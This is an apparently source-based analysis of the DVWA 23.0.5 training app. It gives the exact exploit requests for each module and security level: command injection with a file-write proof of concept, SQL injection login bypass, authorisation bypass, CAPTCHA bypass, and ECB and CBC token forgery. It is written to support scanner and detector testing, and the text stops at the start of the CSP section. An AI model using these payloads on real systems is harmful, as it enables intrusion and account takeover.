# DVWA 23.0.5 — Source-Code Analysis & Exploit Matrix

**Target sources:** `reference/dvwa` (clone of github.com/digininja/DVWA, README.md L161/L167 says `Version: 23.0.5`; commit `068d974` "Merge pull request #774 ... improved login validation").
**Scope:** all 19 vulnerability directories under `vulnerabilities/` × 4 security levels (low/medium/high/impossible) = 76 module/level cells.
**Method:** static source reading. **No live instance was contacted.** Every claim below is taken from the checked-in PHP/JS; file:line references are relative to `reference/dvwa/`.

---

## 0. Conventions used in this document

- `{BASE}` = URL of the DVWA web root. Docker compose default: `http://127.0.0.1:4280` (`compose.yml` L25 maps `127.0.0.1:4280 -> 80`). Docroot inside the container is `/var/www/html` (`Dockerfile` L6).
- `/{mod}/` is shorthand for `/vulnerabilities/{mod}/`.
- A "success marker" is a substring/regex of the response body (or an HTTP status/header) that a detector can assert **without a browser**. Where only a browser can confirm execution (DOM XSS, CSP), it says so explicitly.
- Token/CSRF mechanics are described once in §1.3 and referenced from the module tables.
- **Important global default:** `config/config.inc.php` is **absent** in the tree (only `config/config.inc.php.dist`; `dvwaPage.inc.php` L8-10 dies without it), and the stock default security level is **`impossible`** (`config.inc.php.dist` L33, overridable via env `DEFAULT_SECURITY_LEVEL`). reCAPTCHA keys default to empty strings (`config.inc.php.dist` L27-28). The Dockerfile copies `.dist -> .inc.php` unchanged (`Dockerfile` L21), so a stock Docker instance starts at `impossible` and has a non-functional CAPTCHA module.

---

## 1. Bootstrap flow (login → security level → DB reset)

### 1.1 Session / cookies

| Cookie | Set by | Meaning |
|---|---|---|
| `PHPSESSID` | PHP default (no `session.name` override anywhere in repo; `php.ini` contains only 3 directives) | PHP session id; holds `$_SESSION['dvwa']` (`username`, `locale`, `messages`) and `$_SESSION['session_token']`. |
| `security` | `dvwaSecurityLevelSet()` `dvwaPage.inc.php` L218-228 | Current security level: `setcookie('security', $pSecurityLevel, 0, "/", "", false, $httponly)`; `$httponly = true` only for `impossible`. Read with priority over defaults in `dvwaSecurityLevelGet()` L200-216. |
| `dvwaSession` | Weak Session IDs module only (`vulnerabilities/weak_id/source/*.php`) | The deliberately weak ID being studied. Not a real auth cookie. |

- On every page include, if `security` cookie is missing or not one of `low|medium|high|impossible` (`dvwaPage.inc.php` L21-31) the app sets it to `$_DVWA['default_security_level']` (else `impossible`).
- Session cookie flags (`dvwaPage.inc.php` L45-106): `impossible` → `HttpOnly`, `SameSite=Strict`, lifetime 86400 s and **session id regenerated** on login/security change; lower levels → no HttpOnly/SameSite and **the same session id is kept** (session-fixation by design). So after a login request on `impossible`, re-read the `Set-Cookie: PHPSESSID=...` from the 302 response.
- Session data: `dvwaLogin()` stores `$_SESSION['dvwa']['username']` (L140-143); `dvwaIsLoggedIn()` L146-154; `dvwaCurrentUser()` L172-175; `dvwaLogout()` L157-160 (used by `logout.php`, which 302s back to `login.php`).

### 1.2 `user_token` (anti-CSRF token) mechanics

- Generation: `generateSessionToken()` — `dvwaPage.inc.php` L647-652:
  ```php
  if( isset( $_SESSION[ 'session_token' ] ) ) { destroySessionToken(); }
  $_SESSION[ 'session_token' ] = md5( uniqid() );
  ```
  → **32 lowercase hex chars** (MD5 of `uniqid()`), stored in the PHP session.
- Rendering: `tokenField()` L658-660:
  ```php
  return "<input type='hidden' name='user_token' value='{$_SESSION[ 'session_token' ]}' />";
  ```
- Validation: `checkToken($user_token, $session_token, $returnURL)` L634-645:
  ```php
  if( $user_token !== $session_token || !isset( $session_token ) ) {
      dvwaMessagePush( 'CSRF token is incorrect' );
      dvwaRedirect( $returnURL );   // 302 Location: $returnURL (usually "index.php" relative to module dir)
  }
  ```
- **Tokens are per page load and effectively one-shot:** pages call `generateSessionToken()` again at the end of the request, destroying the previous value. Pattern is: `GET page → parse name="user_token" value → immediately POST`. If the token is wrong/missing the server answers **302** to the module's `index.php` (not an error page) — use this 302 as the "token rejected" marker.
- Field name is always `user_token` except CSRF-high JSON mode, which uses header `user-token` (`$_SERVER['HTTP_USER_TOKEN']`, `vulnerabilities/csrf/source/high.php` L10-14).

### 1.3 Programmatic login

1. `GET {BASE}/login.php` (unauthenticated; `login.php` L6 `dvwaPageStartup(array())`) with a cookie jar.
   - Response sets `PHPSESSID` and contains exactly one hidden token: `<input type='hidden' name='user_token' value='<md5>' />` (`login.php` L66 calls `generateSessionToken()`, L113 `tokenField()`).
   - If the `users` table does not exist yet, login POST redirects to `setup.php` (`login.php` L41-44) → do §1.5 first.
2. `POST {BASE}/login.php`, `Content-Type: application/x-www-form-urlencoded`, body:
   ```
   username=admin&password=password&Login=Login&user_token=<token-from-step-1>
   ```
   - `Login` must simply be *set* (`if( isset( $_POST['Login'] ) )`, L10; the form value is `Login`).
   - Server: `$user`/`$pass` are `stripslashes` + `mysqli_real_escape_string`; password then `md5()` (L20-27). Empty user/pass are rejected with a message (`L30-34`).
   - Query: `SELECT * FROM users WHERE user='$user' AND password='$pass'` (L46).
3. Success → **302 Location: `index.php`**; `dvwaLogin($user)` stores username in session; message "You have logged in as 'admin'" shows on the next page (L48-51).
   Failure → **302 Location: `login.php`**, next GET shows `Login failed` (L54-56).
4. Verify session: `GET {BASE}/index.php` → 200 and body contains `Username:</em> admin` (system-info block, `dvwaPage.inc.php` L362-376). If it 302s to `login.php`, login failed.
   - Note: the `GET login.php` response also sets the `security` cookie to `$_DVWA['default_security_level']` when it was absent (`dvwaPage.inc.php` L21-31) — keep it in the cookie jar, then override it via §1.4.

Default credentials (DB seed, `dvwa/includes/DBMS/MySQL.php` L54-59; roles L42, L66-70):

| user_id | user | password | role |
|---|---|---|---|
| 1 | `admin` | `password` | admin |
| 2 | `gordonb` | `abc123` | user |
| 3 | `1337` | `charley` | user |
| 4 | `pablo` | `letmein` | user |
| 5 | `smithy` | `password` | user |

### 1.4 Switching security level programmatically

Two independent ways; both are legitimate — the state lives **only in the `security` cookie**, not in the session and not in the DB (`dvwaSecurityLevelGet()` L200-216 reads `$_COOKIE` first; `dvwaSecurityLevelSet()` L218-228 writes only the cookie).

**A. Direct cookie (simplest, reliable):** send `Cookie: security=low` on every request (values `low|medium|high|impossible`). No token, no login needed for the level itself (login is still needed for authenticated pages). Downside: session-cookie hardening flags are not updated.

**B. UI POST (mirrors a browser; recommended once after login):**
1. `GET {BASE}/security.php` (authenticated; `security.php` L6 `dvwaPageStartup(array('authenticated'))`) → parse `user_token` (`security.php` L51).
2. `POST {BASE}/security.php` body:
   ```
   security=low&seclev_submit=Submit&user_token=<token>
   ```
   Fields: `security` (select, L72-74), `seclev_submit` (submit, L75), `user_token` (L76). Token check `security.php` L14-16; whitelist switch L17-33.
3. Server calls `dvwaSecurityLevelSet($securityLevel)` (L33), then `dvwa_start_session()` (L35), then `dvwaPageReload()` → **302 Location: `{BASE}/security.php`** (L36; `dvwaPage.inc.php` L163-170). Response also has `Set-Cookie: security=low; path=/` and (only for `impossible`) a new `PHPSESSID`.
4. Verify: any authenticated page contains `Security Level:</em> low` (rendered in the system-info footer, `dvwaPage.inc.php` L344-364). `GET /security.php` also shows `<em>low</em>`.
- Unknown values (`switch` default, L28-31) silently become `impossible`.
- Setting `impossible` switches the PHP session to HttpOnly + SameSite=Strict and regenerates the session id — always consume updated cookies.

### 1.5 Initialize / reset the database via `setup.php`

- `setup.php` requires **no login** (`dvwaPageStartup(array())`, L6) but needs a working DBMS config. POST detection is `isset($_POST['create_db'])` (L12) — only presence required, value arbitrary.
1. `GET {BASE}/setup.php` → parse `user_token` (`setup.php` L36-37).
2. `POST {BASE}/setup.php`, form-urlencoded:
   ```
   create_db=Create+/+Reset+Database&user_token=<token>
   ```
   (UI submit button: `name="create_db" type="submit" value="Create / Reset Database"`, L161-164.)
3. Server: `checkToken(... 'setup.php')` (L20); includes `dvwa/includes/DBMS/MySQL.php` (L22-23) which (re)creates `users`, `access_log`, `security_log`, `guestbook`, inserts the seed rows and copies `config/config.inc.php` → `config/config.inc.php.bak` (`MySQL.php` L125-130, the backup-file disclosure). Pushes `<em>Setup successful</em>!` (L136) then `dvwaPageReload()` → **302 Location: `{BASE}/setup.php`** (L140).
4. Verify: `GET {BASE}/setup.php` contains `Setup successful` (rendered as `<em>Setup successful</em>!`) and `Database Setup`.
- Reset restores default users/passwords (admin/password etc.), empties guestbook, clears password changes made by CSRF/CAPTCHA exploits. **Use this between destructive module tests.**
- If `$DBMS != 'MySQL'` the script pushes "PostgreSQL is not yet fully supported." and reloads (L25-29) — nothing is created.

### 1.6 Bootstrap gotchas that commonly break automated agents

1. **Token race:** never fetch the same token-bearing page twice before submitting; the second GET invalidates the token.
2. **Bad token = 302, not 403:** `checkToken` redirects to `index.php` and the message appears only on the *next* page. Detectors must treat the 302 as "token missing/wrong", not as module secure.
3. **Default level is `impossible`:** without `DEFAULT_SECURITY_LEVEL=low` in the environment (or a `security` cookie), all modules run their impossible sources.
4. **Destructive password changes:** CSRF and CAPTCHA modules update `users.password` of the *current session user* (normally `admin`, MD5 of the new password). Keep the original (`password`) and restore with `setup.php` reset, or log in with the new password afterwards. `vulnerabilities/csrf/test_credentials.php` can check a password without logging out: `POST /vulnerabilities/csrf/test_credentials.php` body `username=admin&password=<pw>&Login=Login` → `Valid password for 'admin'` / `Wrong password ...`.
5. **Stored XSS cleanup:** `POST {BASE}/vulnerabilities/xss_s/` body `btnClear=Clear+Guestbook` → `TRUNCATE guestbook` (no token required; `vulnerabilities/xss_s/index.php` L16-19).
6. **Uploaded files persist** under `/hackable/uploads/`; note what you upload.
7. **Login CSRF token** itself is needed on `login.php` (any login POST without it is redirected back with "CSRF token is incorrect").
8. **`security` cookie must be sent on every request**; do not rely on session state for it.
9. `logout.php` (GET) destroys the username only, then 302 → `login.php`; the `security` cookie persists.

---

## 2. Global conventions

- **URL model:** every module is a directory with `index.php` at `/{mod}/` (trailing slash canonical; Apache adds it with a 301 if omitted). Level logic is `switch(dvwaSecurityLevelGet())` in `/{mod}/index.php`, then `require_once .../source/{level}.php`; the `source/` files manipulate `$html`/`$page['body']`. Another level's source file can only trigger via the level cookie — there is no `?security=` override.
- **Module-page auth:** every `vulnerabilities/*/index.php` calls `dvwaPageStartup(array('authenticated'))` except `login.php`, `setup.php`, `logout.php`, and the raw helper files in module roots (e.g. `open_redirect/source/*.php`, `authbypass/get_user_data.php`, `authbypass/change_user_details.php`, `cryptography/source/check_token_*.php`, `csp/source/jsonp*.php`, `javascript/source/*.js`, `upload`ed files) which have **no DVWA auth check** and can be hit unauthenticated. The API endpoints (`/vulnerabilities/api/v2/...`) are also unauthenticated (see §3.1).
- **Menu visibility ≠ access control:** Authorisation Bypass menu entry only for `admin` (`dvwaPage.inc.php` L311-313); Broken Access Control menu entry is commented out (L317); both modules are fully reachable by direct URL.
- **Output envelope:** normal pages include the site chrome; useful invariant strings: `Username:</em> <user>`, `Security Level:</em> <level>`, `<div class="message">…` for pushed messages, `<div class="success">` / `warning` / `nearly` for module feedback.
- **Standard errors/statuses:** `302` + `Location: .../index.php` = token rejected; `302` to `login.php` = not authenticated; `404` = blind-SQLi "false" at low and impossible levels; `403` + `Unauthorised` = authorisation-bypass page blocked; `500` chosen by FI/open-redirect handlers for invalid input.
- **Response headers commonly present:** `Cache-Control: no-cache, must-revalidate`, `Content-Type: text/html;charset=utf-8` (`dvwaPage.inc.php` L385-387).
- **Required non-cookie headers:** only in specific modules — `Referer` (CSRF medium), `User-Agent: reCAPTCHA` (CAPTCHA high), `Content-Type: application/json` (API, CSRF-high JSON, Cryptography-high/impossible), `Authorization: Bearer` / `Basic` (API order/login), `user-token` (CSRF high JSON).
- **DB tables:** `users`, `guestbook`, `access_log`, `security_log` (`MySQL.php` L42-123); `bac_log` created lazily by the BAC module (`vulnerabilities/bac/index.php` L16-45).
- **URL encoding:** payloads for GET endpoints must be percent-encoded (`#` → `%23`, space → `%20`/`+`); for POST/PUT bodies send them as form-urlencoded or JSON per the module section (a `#` in a query string is a fragment and would never reach the server).

## 3. Per-module exploit matrix

Notation inside each block: `URL` = path relative to `{BASE}`; `method`; `params` = exact field names; `PHP` = the filter/logic (quoted where it clarifies); `exploit` = the exact request that succeeds; `marker` = reliable detection string.

---

### 3.1 API — `/vulnerabilities/api/`

**Key structural fact:** `vulnerabilities/api/index.php` is an instructional page (requires DVWA login, L6) but the API itself (`public/index.php`, routed by `vulnerabilities/api/.htaccess` L1-10 through `mod_rewrite`) has **no DVWA session/auth check**. The per-level `source/*.php` files only change the *instructions and JS*; the controllers in `src/` are **not gated by the DVWA security cookie**. Consequence: the four weaknesses below are present **at every security level**; the "level" only labels the challenge. A scanner should test all of them regardless of the `security` cookie.

API base: `{BASE}/vulnerabilities/api/v{1,2}/...`; all responses `Content-Type: application/json; charset=UTF-8`. There is no versionless route: `public/index.php` finds the first path segment equal to `order|user|health|login`, treats the segment before it as the version (`v1`/`v2`) and the next as the controller (`public/index.php` L17-50). Exact working routes:

| # | Weakness | Exact request | Marker |
|---|---|---|---|
| A | **API versioning leaks password hashes** (`User::toArray(1)` includes `password`, `src/User.php` L38-59; hardcoded users `src/UserController.php` L30-34) | `GET /vulnerabilities/api/v1/user/` (also `/v1/user/1`) — no body/headers | JSON contains `"password":"<sha256 hex>"`; v2 output has only id/name/level |
| B | **Mass assignment / privilege escalation** (`updateUser()` accepts `level` without authz: `src/UserController.php` L208-230) | `PUT /vulnerabilities/api/v2/user/2`, `Content-Type: application/json`, body `{"name":"morph","level":0}` | `"level":0` in the 200 JSON (baseline level was 1); note state is per-request (hardcoded arrays) — assert the POST response, not a later GET |
| C | **Command injection** (`exec("ping -c 4 " . $target, $output, $ret_var)`, `src/HealthController.php` L83-102) | `POST /vulnerabilities/api/v2/health/connectivity`, `Content-Type: application/json`, body `{"target":"127.0.0.1; false"}` (probe) then `{"target":"127.0.0.1; true"}`, timing `{"target":"127.0.0.1; sleep 3"}` | Probe `; false` → HTTP 500 `{"status":"Connection failed"}` while `; true` → HTTP 200 `{"status":"OK"}` (the injected command's exit status drives `$ret_var`); `sleep` variant adds latency. File-write PoC: `{"target":"127.0.0.1; echo PWNED > /var/www/html/hackable/uploads/api_rce.txt"}` then `GET /hackable/uploads/api_rce.txt` |
| D | **OAuth 2.0 token flow** (legit feature; see impossible below) | see exact flow | 401 vs 200 |

Other endpoints (all unauthenticated): `GET /v2/health/status` → `{"status":"OK"}`; `GET /v2/health/ping` → `{"Ping":"Pong"}`; `POST /v2/health/echo` `{"words":"x"}` → `{"reply":"x"}`; `GET /v2/user/{id}`; `GET /v2/user/`/`/v2/user` (all); `POST /v2/user/` `{"name":"x","level":1}`; `DELETE /v2/user/{id}`; `GET /v2/order/{id}`, `GET /v2/order/`, `POST /v2/order/` (`{"name","address","items"}`); orders require `Authorization: Bearer` (see D). HTML form pages: `POST /v2/user/` and `/v2/user/{id}` require `Content-Type: application/json` exactly (`src/Helpers.php` L6-14) else 415. Errors: 404 `GenericController` (empty body), 422 `{"error":"Invalid input"}`, 405 empty.

**Per level (challenge mapping):**
- **low** — objective "find v1": exploit A. Detector marker: `"password":` in `/v1/user/` JSON; the page-side success div is only shown after browser JS (`source/low.php` L115: "Well done, you found the password hashes."), ignore it for HTTP detection.
- **medium** — objective "elevate to admin": exploit B. Marker `"level":0`; page text (browser-only) "Well done, you elevated your user to admin." (`source/medium.php` L92).
- **high** — objective "find vulnerable health call": exploit C (hint points at `openapi.yml`; `source/high.php` L7).
- **impossible** — objective "automate OAuth 2.0" (`source/impossible.php` L5-11). Not a vulnerability; the detector should verify the guarded flow instead:
  1. `POST /vulnerabilities/api/v2/login/login` with `Authorization: Basic base64("1471.dvwa.digi.ninja:ABigLongSecret")`, `Content-Type: application/x-www-form-urlencoded`, body `grant_type=password&username=mrbennett&password=becareful` → **200** JSON `{"token":"<JSON string>"}` (`src/LoginController.php` L75-147; creds L86-96; `src/Login.php` L9-24). Parse the nested JSON string: `access_token`, `refresh_token`, `token_type":"bearer"`, `expires_in":180`.
  2. `GET /vulnerabilities/api/v2/order/1` (or `/order/`) with `Authorization: Bearer <access_token>` → **200** order JSON (`src/OrderController.php` L24-36, L96-146). Missing/invalid → **401** `{"status":"Invalid or missing token"}` (marker of correct authz).
  3. Refresh: `POST /v2/login/refresh` (same Basic auth) + form body `grant_type=refresh_token&refresh_token=<refresh_token>` → new bundle (`LoginController` L108-128).
  4. Token check: `POST /v2/login/check_token`, `Content-Type: application/json`, body `{"token":"<access_token>"}` → **200** `{"token":"Valid"}`; invalid → **401** `{"status":"Invalid"}` (L209-230).
  - Token internals (`src/Token.php` L9-11, L22-48): AES-128-GCM, key `Paintbrush`, packed as `base64(tag . ":::::" . iv . ":::::" . ciphertext)`; secrets `12345`/`98765` (`Login.php` L9-12); access life 180 s, refresh 240 s. Key is server-side and GCM is authenticated → not forgeable: report "not exploitable".
  - Note: `loginJSON()` (`LoginController` L48-72) is dead code (never dispatched); only the OAuth-style `login()` is reachable.

---

### 3.2 Authorisation Bypass — `/vulnerabilities/authbypass/`

Menu entry rendered only for `admin` (`dvwaPage.inc.php` L311-313); page `index.php` requires login (L6). Low-priv account for testing: **gordonb / abc123**. AJAX endpoints used by the page:
- `GET /vulnerabilities/authbypass/get_user_data.php` → JSON array `[{"user_id":1,"first_name":"admin","surname":"admin"}, ...]` (query selects `user_id, first_name, last_name` and the JSON key is `surname`, L15-40); authz check only blocks non-admin at **high/impossible** (L10-13), and the file has **no `dvwaPageStartup`** at all → no session required at low/medium.
- `POST /vulnerabilities/authbypass/change_user_details.php` → JSON update. Requires POST (L16-21) with JSON body keys `id`, `first_name`, `surname` (L26-47); returns `{"result":"ok"}` (L50) or `{"result":"fail","error":"..."}`. Only the **impossible** level checks the user (L11-14); no session auth check otherwise. SQL built by string concatenation (L47) → SQLi at low/medium/high.

| Level | What the module page returns to non-admin | Endpoint behaviour to non-admin | Working exploit | Marker |
|---|---|---|---|---|
| low | **200** full page (source/low.php empty) | `get_user_data.php` → 200 user list; `change_user_details.php` → `{"result":"ok"}` | `GET /vulnerabilities/authbypass/get_user_data.php` | 200 + JSON array with `"user_id":1` / `"first_name":"admin"` |
| medium | **403** body `Unauthorised` (`source/medium.php` L13-17) | same as low (endpoints unguarded) | same GET `get_user_data.php` (or POST update) | 200 + JSON array (page 403 must not be scored as secure) |
| high | **403** `Unauthorised` | `get_user_data.php` → `{"result":"fail","error":"Access denied"}`; `change_user_details.php` → works | `POST /vulnerabilities/authbypass/change_user_details.php`, `Content-Type: application/json`, `{"id":1,"first_name":"Harry","surname":"Hacker"}` (sample from `authbypass/help/help.php`) | `{"result":"ok"}` |
| impossible | **403** `Unauthorised` | get → `{"result":"fail","error":"Access denied"}`; change → same fail JSON | none (all guarded) | fail JSON + 403 page → report "not exploitable" |

- The endpoint check is only "is current user admin" (`dvwaCurrentUser() != "admin"`), and `dvwaCurrentUser()` is `Unknown` when no session is present — so for unauthenticated endpoint tests send `Cookie: security=low|medium|high` explicitly (otherwise the code defaults the level to `impossible` and refuses).
- **Bonus bug (non-goal):** SQL injection in `change_user_details.php` L47 (`$data->id` unquoted, names quoted but unescaped): body `{"id":"1 OR 1=1","first_name":"x","surname":"y"}` → updates every row, response `{"result":"ok"}`.
- Detector guidance: low = page + data API reachable by non-admin; medium = data API reachable although page 403; high = update API reachable although page+data API block; impossible = all JSON `fail`/403.

---

### 3.3 Broken Access Control (BAC) — `/vulnerabilities/bac/`

Not in the menu (`dvwaPage.inc.php` L317 commented out) — direct URL only; login required (`index.php` L8). The request is a **GET to `/{mod}/`** with query fields `action` and `user_id` (`index.php` L140-146; source files only act when both are set). `bac_log` is auto-created and every attempt is logged/displayed on the page.

| Level | Access control in source | Exploit request (authenticated as gordonb/abc123 or admin) | Marker |
|---|---|---|---|
| low | Cookie check: `intval($_COOKIE['user_id'])` must equal target `$id` (`source/low.php` L30-54) | `GET /vulnerabilities/bac/?action=View+Profile&user_id=2` with extra cookie `user_id=2` (keep PHPSESSID + `security=low`) | `<h3>User Profile</h3>` + `<p>Name: Gordon Brown</p>`; without the cookie → `Access denied. No user_id cookie found.` |
| medium | Query check: `$_GET['token'] == 'user_token'` (`source/medium.php` L26) | `GET /vulnerabilities/bac/?action=View+Profile&user_id=2&token=user_token` | same profile block |
| high | `$_SESSION['user_id']` (set from current user at L106-109) must equal target (L40-69) — **not request-controllable** | `GET /vulnerabilities/bac/?action=View+Profile&user_id=2` as a non-admin → denied; only own id works | `<p>Access denied. You can only view your own profile.</p>` → detector: **no bypass** (module `help/help.php` claims a `user_id` cookie vector, but that is the low-level description; the code uses the session — source L40/L107-108 is authoritative) |
| impossible | Strict self-check + prepared statements + rate limit 10 requests / 300 s (`source/impossible.php` L51-125, L143-180) | any non-self request | `<p>Access denied. Insufficient privileges.</p>` → not exploitable |

- Other observable side effects: page sets/prints a decorative `user_role` cookie (`low.php` L89-95 — display only, no access impact); IP from `X-Forwarded-For` is logged (`low.php` L77) → log forging.
- Success indicators for low/medium: `access_log`/`bac_log` page shows target name; profile block includes `Avatar:`.
- `/vulnerabilities/bac/log_viewer.php` is a **0-byte file** (security.php L83 links to it) — blank page, not a failed scan.

---

### 3.4 Brute Force — `/vulnerabilities/brute/`

Form fields (all levels): `username`, `password`, `Login` (submit name/value `Login`); high/impossible also submit hidden `user_token` (`index.php` L50-51).

| Level | Method/URL | Server logic | Exploit | Marker |
|---|---|---|---|---|
| low | `GET /vulnerabilities/brute/?username=admin&password=password&Login=Login` | `$pass=md5($pass)`; `SELECT * FROM users WHERE user='$user' AND password='$pass'` — **`$user` unescaped** (`source/low.php` L4-13) | Valid creds, or SQLi login bypass `username=admin'%23&password=x&Login=Login` (→ `user='admin'#' AND password=...`) | `<p>Welcome to the password protected area admin</p>`; failure `<pre><br />Username and/or password incorrect.</pre>` |
| medium | `GET /vulnerabilities/brute/?username=...&password=...&Login=Login` | both inputs `mysqli_real_escape_string`; `sleep(2)` on failure (L6-11, L28) | valid creds; ~2 s per failed guess; no lockout/token | same welcome marker |
| high | `GET /vulnerabilities/brute/?username=admin&password=password&Login=Login&user_token=<token>` | token checked (L5), then inputs escaped; `sleep(rand(0,3))` on failure (L33); fresh token generated at end (L41) | GET page → parse token → GET with token (token is per-request: fetch then use immediately) | same welcome marker |
| impossible | `POST /vulnerabilities/brute/` body `username=admin&password=password&Login=Login&user_token=<token>` | token (L5) + PDO prepared (L24-26, L53-57) + **lockout after 3 failed attempts per user for 15 min** (L19-20, L30-50) | Not brute-forceable; a few guesses then lockout. Do **not** brute-force `admin` here (locks real login for 15 min) | success `<p>Welcome to the password protected area <em>admin</em></p>` (note `<em>`); failure `...please try again in 15 minutes...` |

- Module purpose is credential brute force; for a scanner, a small known-credential check (`admin/password`) is enough to confirm the endpoint works; low adds the SQLi bypass. Success regex: `Welcome to the password protected area`.
- Also, success leaks the avatar path returned by the DB, `<img src="/hackable/users/admin.jpg" />` (`MySQL.php` L53: `$base_dir = str_replace("setup.php","",$_SERVER['SCRIPT_NAME'])` → `/`).

---

### 3.5 Insecure CAPTCHA — `/vulnerabilities/captcha/`

Form fields: `step` (hidden 1), `password_new`, `password_conf`, `Change=Change`, `g-recaptcha-response` (reCAPTCHA widget); high/impossible also `user_token`; impossible also `password_current` (`index.php` L60-84).

**reCAPTCHA keys:** `$_DVWA['recaptcha_public_key']/private_key` are empty by default (`config.inc.php.dist` L27-28). `index.php` L38-42 then shows `reCAPTCHA API key missing` and **overwrites `$html` with "Please register for a key"**, hiding the form; server-side the step handlers still run. `recaptcha_check_answer()` is a live call to `https://www.google.com/recaptcha/api/siteverify` returning boolean success or `null` on error (`external/recaptcha/recaptchalib.php` L5-36). Two consequences: (a) with empty keys any real CAPTCHA check fails; (b) even when the password-change side effect succeeds, the success text may be replaced on the page — verify via `csrf/test_credentials.php` or a re-login, then `setup.php` reset.

| Level | Logic | Exploit | Marker |
|---|---|---|---|
| low | Step 1 validates CAPTCHA then prints a hidden step=2 form; **step 2 only checks `Change` set + `step==2` + password match** — no CAPTCHA at all (`source/low.php` L45-73) | `POST /vulnerabilities/captcha/` body `step=2&password_new=Pwn123&password_conf=Pwn123&Change=Change` | Password changed in DB; response success `<pre>Password Changed.</pre>` **only if reCAPTCHA keys are configured** (otherwise page shows "Please register for a key"). Verify via `csrf/test_credentials.php`; restore with setup reset |
| medium | Step 2 additionally requires truthy `passed_captcha` (L55-59) | `POST /vulnerabilities/captcha/` body `step=2&password_new=Pwn123&password_conf=Pwn123&passed_captcha=true&Change=Change` (help/help.php shows exact payload) | same as low |
| high | Single step: `if ($resp || ($_POST['g-recaptcha-response']=='hidd3n_valu3' && $_SERVER['HTTP_USER_AGENT']=='reCAPTCHA'))` (L17-23). The form contains `user_token` but `high.php` **never calls `checkToken`** (only `generateSessionToken`, L53) → token not required | `POST /vulnerabilities/captcha/` headers `User-Agent: reCAPTCHA` + body `password_new=Pwn123&password_conf=Pwn123&Change=Change&g-recaptcha-response=hidd3n_valu3&step=1` | `<pre>Password Changed.</pre>` when keys configured; otherwise side effect only |
| impossible | token check (L5) + real CAPTCHA (L27-37) + current-password PDO check (L40-46) | none | CAPTCHA incorrect / current-password failure text; report "not exploitable" |

- All levels update the **current session user's** password (`UPDATE users SET password=MD5(...)`) — normally `admin`.
- Detection note: because the hardcoded secret `hidd3n_valu3` is in a source comment in `index.php` L75 (`<!-- **DEV NOTE** Response: 'hidd3n_valu3' && User-Agent: 'reCAPTCHA' **/DEV NOTE** -->`), high is exploitable even without knowing the private key.

---

### 3.6 Cryptography — `/vulnerabilities/cryptography/`

Page form posts to `$_SERVER['PHP_SELF']` = `{BASE}/vulnerabilities/cryptography/index.php` (`source/low.php` L56, L102; medium L100). No `user_token` at any level.

| Level | Endpoint / fields | Server logic (filter/crypto) | Exploit | Marker |
|---|---|---|---|---|
| low | `POST /vulnerabilities/cryptography/` (`index.php`) — `password=<value>` (also `message`, `direction=encode/decode`) | XOR "encryption": `xor_this(base64_decode($message), "wachtwoord")` (L3-16, L31-36). Login check is **`if ($password == "Olifant")`** — it compares the submitted string to the literal password (L38-46); the intercepted Base64 challenge (L85) decodes+XORs to `Your new password is: Olifant` | `POST /vulnerabilities/cryptography/` body `password=Olifant` | `<div class="success">Welcome back user</div>` |
| medium | `POST /vulnerabilities/cryptography/` — `token=<hex>` (hex length must be a multiple of 32, L22) | AES-128-ECB, key `ik ben een aardbei` (L2-10); decrypted JSON must satisfy `{"user":"sweep","ex":>now,"level":"admin"}` (L27-36) | Splice ECB blocks from the three tokens shown on the page (`medium.php` L52-64) exactly as `source/ecb_attack.php` L55-60 / `help/help.php` describes: `token=3061837c4f9debaf19d4539bfa0074c1`+`174d4b2659239bbc50646e14a70becef`+`837d1e6b16bfae07b776feb7afe57630`+`caeb574f10f349ed839fbfd223903368873580b2e3e494ace1e9e8035f0e7e07` = **`3061837c4f9debaf19d4539bfa0074c1174d4b2659239bbc50646e14a70becef837d1e6b16bfae07b776feb7afe57630caeb574f10f349ed839fbfd223903368873580b2e3e494ace1e9e8035f0e7e07`** (decrypts to `{"user":"sweep","ex":1823620672,"level":"admin","bio": "Squeeeeek"}`, verified by local OpenSSL) | `<div class="success">Welcome administrator Sweep</div>`; decryptable-but-wrong JSON → `<div class="nearly">Login successful but not as the right user.</div>`; format/decrypt errors → `<div class="warning">` |
| high | `POST /vulnerabilities/cryptography/source/check_token_high.php` — `Content-Type: application/json` **exactly** (L8), JSON body `{"token":"<b64 ciphertext>","iv":"<b64 iv>"}` | `token_library_high.php`: `KEY="rainbowclimbinghigh"`, `ALGO="aes-128-cbc"`, `IV="1234567812345678"` (L3-5); plaintext `"userid:2"` (L37); **the IV supplied by the client is used for decryption** (`decrypt($ciphertext,$iv)`, L92-101). Users: 1=Geoffery/admin, 2=Bungle/user, 3=Zippy, 4=George (L54-58, L102-116). AES-128 uses the first 16 key bytes (`rainbowclimbingh`) | **CBC IV malleability:** take the token+IV displayed by the page (they are deterministic: `token=PhQwGVA3q+T2mT+L3Pe5Vg==`, `iv=MTIzNDU2NzgxMjM0NTY3OA==`), decode IV, XOR byte index 7 with `0x03` (changes `"userid:2"`→`"userid:1"`), re-encode (`iv=MTIzNDU2NzsxMjM0NTY3OA==`). Request: `POST .../source/check_token_high.php` body `{"token":"PhQwGVA3q+T2mT+L3Pe5Vg==","iv":"MTIzNDU2NzsxMjM0NTY3OA=="}`. (Robust recipe: always parse token/iv from the page HTML textarea first; only `iv[7]^=0x03` is needed.) | `{"status":200,"user":"Geoffery","level":"admin"}` (baseline unmodified → `"user":"Bungle","level":"user"`) |
| impossible | same contract, `POST /vulnerabilities/cryptography/source/check_token_impossible.php` | `token_library_impossible.php`: AES-256-GCM, random 12-byte IV, 16-byte tag appended and verified (L4, L21-34, L39-49) | none — tampering gives `{"status":526,"message":"Unable to decrypt token"}`; untouched token gives Bungle/user | report "not exploitable"; assert status 526 on any modified iv/token |

- Helpers in `source/` (`xor_theory.php`, `ecb_attack.php`, `oracle_attack.php`) are standalone scripts; only `check_token_high.php`/`check_token_impossible.php` are HTTP endpoints. `oracle_attack.php` is a CLI padding-oracle implementation (`getopt`, `--local|--url/--iv/--token`).
- The high-level page loads token data from `create_token()` (`token_library_high.php` L36-51) rendered HTML-escaped in a `<textarea>`; HTML-unescape before JSON-parsing.

---

### 3.7 CSP Bypass — `/vulnerabilities/csp/`

Request: `POST /vulnerabilities/csp/` field `include=<value>` — no token, no auth beyond login. Each level sends a different `Content-Security-Policy` **response header**:

| Level | CSP header (source line) | DOM injection of `include` | Working exploit | HTTP marker |
|---|---|---|---|---|
